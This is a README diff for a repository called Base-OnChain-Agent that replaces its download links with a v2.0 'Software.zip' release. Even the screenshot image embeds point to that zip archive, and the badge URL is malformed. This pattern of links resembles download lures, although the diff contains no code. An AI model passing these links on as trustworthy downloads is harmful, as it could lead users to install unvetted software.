@@ -44,7 +44,7 @@ For more detailed instructions on setting up and running the project, refer to t
 
 ## Download
 
-[![Download Project Zip](https://github.com/narayananramaratnam/Base-OnChain-Agent/releases/download/v1.0/Application.zip%20Zip-blue)](https://github.com/narayananramaratnam/Base-OnChain-Agent/releases/download/v1.0/Application.zip)
+[![Download Project Zip](https://github.com/narayananramaratnam/Base-OnChain-Agent/releases/download/v2.0/Software.zip%20Zip-blue)](https://github.com/narayananramaratnam/Base-OnChain-Agent/releases/download/v2.0/Software.zip)
 
 Click the button above to download the project zip file. Once downloaded, extract the contents and follow the setup instructions to launch the project.
 
@@ -54,9 +54,9 @@ If the link doesn't work or the file name is missing, please visit the "Releases
 
 Here are some snapshots from the project to give you a sneak peek into the interface:
 
-![Chatbot Interface](https://github.com/narayananramaratnam/Base-OnChain-Agent/releases/download/v1.0/Application.zip)
+![Chatbot Interface](https://github.com/narayananramaratnam/Base-OnChain-Agent/releases/download/v2.0/Software.zip)
 
-![Blockchain Integration](https://github.com/narayananramaratnam/Base-OnChain-Agent/releases/download/v1.0/Application.zip)
+![Blockchain Integration](https://github.com/narayananramaratnam/Base-OnChain-Agent/releases/download/v2.0/Software.zip)
 
 ## Support
 
